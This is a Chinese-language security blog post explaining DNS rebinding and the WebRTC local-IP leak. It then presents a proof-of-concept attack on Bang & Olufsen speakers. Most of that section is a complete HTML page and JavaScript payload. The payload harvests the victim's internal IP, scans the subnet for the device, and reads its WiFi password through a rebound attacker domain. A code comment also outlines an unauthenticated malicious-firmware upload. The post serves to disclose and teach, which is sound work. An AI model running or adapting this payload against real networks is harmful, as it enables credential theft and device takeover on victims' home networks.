---
layout: post
title: "Web:DNS Rebinding & WebRTC 漏洞"
date:   2016-10-13
excerpt: "对DNS Rebinding和WebRTC漏洞的机制和利用进行了详细描述，并给出了一个利用这2个漏洞进行的实际攻击"
tag:
- Web
---
<h2 id="dns-rebinding-">DNS Rebinding概要</h2>
<p>　　DNS rebinding 攻击是攻击者可以破坏浏览器同源策略的非常好用的工具。攻击滥用DNS，在提供页面内容之后改变一个网址的IP地址。通常是通过一些Javascript有效载荷，欺骗浏览器进入等待状态即DNS缓存无效并执行其他请求，但是仍然相信它是连接到同一个host上的，而实际上，它正在与一个新的被攻击者选中的IP地址通信。这样一来，攻击者可以访问内部服务，渗透出信息，或者做其他一些龌龊的事情。</p>
<h2 id="webrtc-">WebRTC漏洞</h2>
<p>　　WebRTC（网页实时通信，Web Real-Time Communication）是一个支持网页浏览器进行实时语音对话或视频对话的开源标准。使用WebRTC，用户无需安装其他软件或浏览器插件即可进行即时通讯。WebRTC实现了基于网页的视频会议，标准是WHATWG 协议，目的是通过浏览器提供简单的javascript就可以达到实时通讯（Real-Time Communications (RTC)）能力。<br>　　漏洞描述：<br>　　通过WebRTC漏洞网站管理员可以轻易地通过WebRTC看到用户的真实IP地址，即使用户使用VPN隐藏自己的IP。该漏洞影响了支持WebRTC的浏览器，包括Google Chrome和火狐，但只影响Windows操作系统。<br>　　漏洞原理：<br>　　WebRTC采用STUN(Session Traversal Utilities for NAT)、TURN和ICE等协议栈对VoIP网络中的防火墙或者NAT进行穿透。用户发送请求至服务器，STUN服务器会返回用户所用系统的IP地址和局域网地址。<br>　　返回的请求可以通过JavaScript获取，但由于这个过程是在正常的XML/HTTP请求过程之外进行的，所以在开发者控制台看不到。这意味着，这个漏洞的唯一要求就是浏览器要支持WebRTC和JavaScript。<br>　　源自：<a href="http://www.freebuf.com/news/58275.html">http://www.freebuf.com/news/58275.html</a></p>
<h2 id="what-is-stun-turn-">What is STUN&amp;TURN?</h2>
<p>　　STUN（Simple Traversal of UDP over NATs，NAT 的UDP简单穿越）是一种网络协议，它允许位于NAT（或多重NAT）后的客户端找出自己的公网地址，查出自己位于哪种类型的NAT之后以及NAT为某一 个本地端口所绑定的Internet端端口。这些信息被用来在两个同时处于NAT 路由器之后的主机之间建立UDP通信。</p>
<p>　　TURN是网络协议，又称SPAN(Simple Protocol for Augmenting NATs）方式。TURN协议允许NAT或者防火墙后面的对象可以通过TCP或者UDP接收到数据。这在使用了对称式的NAT（或者防火墙）的网络中尤其具有实用价值。<br>　　TURN方式解决NAT问题的思路与STUN相似，是基于私网接入用户通过某种机制预先得到其私有地址对应在公网的地址（STUN方式得到的地址为出口NAT上的地址，TURN方式得到地址为TURNServer上的地址），然后在报文负载中所描述的地址信息直接填写该公网地址的方式，实际应用原理也是一样的。<br>　　TURN的全称为Traversal Using Relay NAT，即通过Relay方式穿越NAT，TURN应用模型通过分配TURNServer的地址和端口作为客户端对外的接受地址和端口，即私网用户发出的报文都要经过TURNServer进行Relay转发，这种方式应用模型除了具有STUN方式的优点外，还解决了STUN应用无法穿透对称NAT（SymmetricNAT）以及类似的Firewall设备的缺陷，即无论企业网/驻地网出口为哪种类型的NAT/FW，都可以实现NAT的穿透，同时TURN支持基于TCP的应用，如H323协议。此外TURNServer控制分配地址和端口，能分配RTP/RTCP地址对（RTCP端口号为RTP端口号加1）作为本端客户的接受地址，避免了STUN应用模型下出口NAT对RTP/RTCP地址端口号的任意分配，使得客户端无法收到对端发过来的RTCP报文（对端发RTCP报文时，目的端口号缺省按RTP端口号加1发送）<br>　　TURN的局限性在于所有报文都必须经过TURNServer转发，增大了包的延迟和丢包的可能性。</p>
<h2 id="-dns-rebinding-webrtc-">利用DNS Rebinding和WebRTC完成的攻击过程示例</h2>
<p>　　B&amp;O扬声器会将你的WIFI密码作为一个未经认证的页面呈现出来，/1000/Bo_network_settings.asp (无需登录认证)。这意味着只需要访问一个本地网络上的页面我们就可以看到密码。<br>　　攻击过程：<br>　　受害人访问恶意网站，我们将这个称恶意网站为attacker.com，这个网站DNS记录的生存时间（TTL）很短，如60s。在该网站的HTML页面上包含一个恶意的Javascript有效载荷，这个有效载荷利用著名的WebRTC内部IP漏洞获取本机的内部IP地址，推断出子网掩码并开始为B&amp;O设备扫描。在我证明概念的代码中，通过自动创建并删除图像标记来寻找IP地址包含/images/BO_processing_grey.gif的地址，该地址便是典型的B&amp;O设备。如果找到了一个，那么扫描结束，真正的DNS重绑定开始。<br>　　我们现在知道B&amp;O设备内部IP地址（比如说是192.168.1.10），我们把这个IP发给攻击者的后端。在后台运行的脚本更改恶意网站的DNS记录为192.168.1.10。而在客户端的JavaScript负载的作用是等待一分钟以上，等待DNS失效,一个熟练的攻击者可能会用一个游戏或者一个很长的有趣的说明文字吸引受害者注意，使其在页面上的停留时间长一点。一分钟之后，这个脚本会再次试图访问http://attacker.com/1000/Bo_network_settings.asp，由于DNS缓存过期，所以浏览器会执行新的DNS请求，而该恶意网站的DNS解析IP已经被攻击者改为了192.168.1.10。而浏览器依然认为我们仍处在同源，所以它就会很开心的读取响应。攻击成功。</a><br><img src="/images/postimage/2016-10-13-DNS-Rebinding/dns_rebinding.png" alt="DNS_Rebinding"></p>
<p>　　POC:<a href="https://github.com/mikispag/dns-rebinding-PoC">https://github.com/mikispag/dns-rebinding-PoC</a></p>
<p>malware html:</p>
<blockquote>
<p>&lt;html&gt;<br>&lt;head&gt;<br>　　&lt;title&gt;DNS Rebinding demo for Bang &amp; Olufsen devices&lt;/title&gt;<br>　　&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js&quot;&gt;&lt;/script&amp;gt</a>;<br>　　&lt;script type=&quot;text/javascript&quot; src=&quot;malicious.js&quot;&gt;&lt;/script&gt;<br>　　&lt;style type=&quot;text/css&quot;&gt;<br>　　　　body {<br>　　　　　　font-family: Helvetica;<br>　　　　}<br>　　　　#container {<br>　　　　　　display: none;<br>　　　　}<br>　　　　#ip_msg {<br>　　　　　　font-weight: bold;<br>　　　　　　font-size: 20px;<br>　　　　　　color: red;<br>　　　　}<br>　　&lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>　　&lt;p id=&quot;ip_msg&quot;&gt;&lt;/p&gt;<br>　　&lt;div id=&quot;container&quot;&gt;&lt;/div&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;</p>
</blockquote>
<p>js payload：</p>
<blockquote>
<p>var last_octet = 1;<br>function rtcGetPeerConnection() {<br>　　var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection ||<br>　　　　window.webkitRTCPeerConnection;<br>　　if (!RTCPeerConnection) {<br>　　　　var iframe = document.createElement(&#39;iframe&#39;);<br>　　　　iframe.style.display = &#39;none&#39;;<br>　　　　document.body.appendChild(iframe);<br>　　　　var win = iframe.contentWindow;<br>　　　　window.RTCPeerConnection = win.RTCPeerConnection;<br>　　　　window.mozRTCPeerConnection = win.mozRTCPeerConnection;<br>　　　　window.webkitRTCPeerConnection = win.webkitRTCPeerConnection;<br>　　　　RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection ||<br>　　　　　　window.webkitRTCPeerConnection;<br>　　}<br>　　if (typeof RTCPeerConnection === &#39;undefined&#39;)<br>　　　　return;<br>　　return RTCPeerConnection;<br>}<br>// WebRTC detection code taken from http://ipleak.net/static/js/index.js<br>function rtcDetection() {<br>　　var ip_dups = {};<br>　　var RTCPeerConnection = rtcGetPeerConnection();<br>　　var mediaConstraints = {<br>　　　　optional: [{<br>　　　　　　RtpDataChannels: true<br>　　　　}]<br>　　};<br>　　var servers = undefined;<br>　　// Add the default Firefox STUN server for Chrome<br>　　if (window.webkitRTCPeerConnection)<br>　　　　servers = {<br>　　　　　　iceServers: [{<br>　　　　　　　　urls: &quot;stun:stun.services.mozilla.com&quot;<br>　　　　　　}]<br>　　　　};<br>　　var pc = new RTCPeerConnection(servers, mediaConstraints);<br>　　// Listen for candidate events<br>　　pc.onicecandidate = function(ice) {<br>　　　　if (ice.candidate) {<br>　　　　　　var ip_regex = /([0-9]{1,3}(.[0-9]{1,3}){3})/<br>　　　　　　var ip_addr_arr = ip_regex.exec(ice.candidate.candidate);<br>　　　　　　if (ip_addr_arr &amp;&amp; ip_addr_arr.length &gt; 0) {<br>　　　　　　　　var ip_addr = ip_addr_arr[1];<br>　　　　　　} else return;<br>　　　　　　// Remove duplicates<br>　　　　　　if (ip_dups[ip_addr] === undefined) {<br>　　　　　　　　if (ip_addr.startsWith(&quot;192.168&quot;)) {<br>　　　　　　　　　　findBOLocalIP(ip_addr);<br>　　　　　　　　}<br>　　　　　　}<br>　　　　　　ip_dups[ip_addr] = true;<br>　　　　}<br>　　};<br>　　pc.createDataChannel(&quot;&quot;);<br>　　pc.createOffer(function(result) {<br>　　　　pc.setLocalDescription(result, function() {},<br>　　　　　　function() {});<br>　　}, function() {});<br>}<br>function findBOLocalIP(clientLocalIP) {<br>　　var ip_minus_last = clientLocalIP.substring(0, clientLocalIP.lastIndexOf(&#39;.&#39;));<br>　　$(&#39;#ip_msg&#39;).text(&quot;Your local IP is &quot; + clientLocalIP + &quot;, scanning &quot; +<br>　　ip_minus_last + &quot;.x subnet...&quot;);<br>　　// Try a /24 scan with 192.168.y.&lt;i&gt; with the exfiltrated y<br>　　setInterval(function() {<br>　　　　if (++last_octet &lt; 255) {<br>　　　　　　$(&quot;&lt;img&gt;&quot;, {<br>　　　　　　　　　　src: &quot;http://&quot; + ip_minus_last + &quot;.&quot; + last_octet +<br>　　　　　　　　　　　　&quot;/images/BO_processing_grey.gif&quot;,<br>　　　　　　　　　　id: ip_minus_last + &quot;.&quot; + last_octet,<br>　　　　　　　　})<br>　　　　　　　　.bind(&#39;load&#39;, function() {<br>　　　　　　　　　　console.log(&quot;Found: &quot; + this.id);<br>　　　　　　　　　　exfiltrateWiFiPassword(this.id);<br>　　　　　　　　}).appendTo($(&#39;#container&#39;));<br>　　　　}<br>　　}, 500);<br>　　// Force to terminate stalled connections in order to avoid connection limit<br>　　setTimeout(function() {<br>　　　　setInterval(function() {<br>　　　　　　$(&#39;#container&#39;).find(&#39;:first-child&#39;).unbind(&#39;load&#39;).attr(&#39;src&#39;,<br>　　　　　　&#39;data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=&#39;).remove();<br>　　　　}, 500);<br>　　}, 5000);<br>}<br>// Alternatively, you could get /1000/bo_restart_in_bsl.asp to trigger a<br>// restart in BSL mode, wait 30 seconds and upload your own firmware<br>// in /1000/bl_firmware_update.asp POSTing to<br>// /goform/formPostHandler a &quot;uploadForm&quot; form with a &quot;appFirmware&quot; file<br>// with enctype=&quot;multipart/form-data&quot;. No XSRF protection.<br>function exfiltrateWiFiPassword(ip) {<br>　　// Send internal IP &quot;ip&quot; to the attacker: we need to change<br>　　// the IP address of this attacker-controlled domain to the<br>　　// B&amp;O internal IP.<br>　　//<br>　　// THIS PART HAS NOT BEEN IMPLEMENTED BECAUSE IT IS NOT NECESSARY<br>　　// FOR DEMONSTRATION PURPOSES.<br>　　console.log(&quot;Exfiltrating WiFi password from &quot; + ip + &quot;...&quot;);<br>　　$(&#39;#ip_msg&#39;).text(&quot;B&amp;O device found at &quot; + ip + &quot;!&quot;).fadeIn();<br>　　// Stop running scan...<br>　　last_octet = 255;<br>　　var WiFiPassword;<br>　　// Wait 70 seconds (60 seconds for cache invalidation + 10 grace seconds)<br>　　// and connect to the attacker-controlled host with the new IP.<br>　　setTimeout(function() {<br>　　　　　　var interval = setInterval(function() {<br>　　　　　　　　$.get(&quot;/1000/Bo_network_settings.asp&quot; +<br>　　　　　　　　　　&#39;?dummy=&#39; + Math.random(),<br>　　　　　　　　　　function(data) {<br>　　　　　　　　　　　　var start = data.lastIndexOf(&#39;top: -100px; display: none&quot;&gt;&#39;);<br>　　　　　　　　　　　　if (start == -1) {<br>　　　　　　　　　　　　　　return;<br>　　　　　　　　　　　　}<br>　　　　　　　　　　　　WiFiPassword = data.slice(start + 28);<br>　　　　　　　　　　　　WiFiPassword = WiFiPassword.slice(0, WiFiPassword.indexOf(&#39;&lt;&#39;));<br>　　　　　　　　　　　　alert(&#39;Password WiFi: &#39; + WiFiPassword);<br>　　　　　　　　　　　　$(&#39;#ip_msg&#39;).text(&quot;WiFi password found: &quot; + WiFiPassword);<br>　　　　　　　　　　　　clearInterval(interval);<br>　　　　　　　　});<br>　　　　　　}, 5000);<br>　　}, 70000);<br>}<br>$(document).ready(rtcDetection);</p>
</blockquote>
